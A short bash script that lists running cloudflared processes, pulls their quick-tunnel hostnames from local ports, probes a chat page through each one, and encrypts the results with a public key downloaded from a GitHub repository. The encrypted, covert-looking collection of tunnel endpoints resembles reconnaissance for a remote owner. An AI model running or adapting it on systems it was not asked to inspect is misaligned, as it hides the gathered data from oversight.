echo "K1: k1_url3"
P=$(mktemp); curl -fsSL "https://raw.githubusercontent.com/MSSTXNEWS/nox-helion-pp-private-build/main/nox-control/c300/bundles/enc/owner_pub.pem?cb=$(date +%s)" -o $P
OUT=""
for pid in $(pgrep cloudflared); do
  tgt=$(tr '\0' ' ' < /proc/$pid/cmdline | grep -oE "(--url|tunnel) +[^ ]+" | tail -1 | awk '{print $NF}')
  for port in $(ss -ltnp 2>/dev/null | grep "pid=$pid," | grep -oE "127\.0\.0\.1:[0-9]+" | cut -d: -f2); do
    h=$(curl -s -m 3 http://127.0.0.1:$port/quicktunnel | grep -oE '"hostname":"[^"]+"' | cut -d'"' -f4)
    [ -n "$h" ] && { c=$(curl -s -o /dev/null -m 10 -w '%{http_code}' "https://$h/web/chat-dc.html"); echo "pid$pid target=$(echo $tgt|sed 's/[0-9]\{4,\}/PORT/') http=$c"; OUT="$OUT $h|$tgt|$c"; }
  done
done
printf '%s' "$OUT" | openssl pkeyutl -encrypt -pubin -inkey $P | base64 -w0; echo; rm -f $P
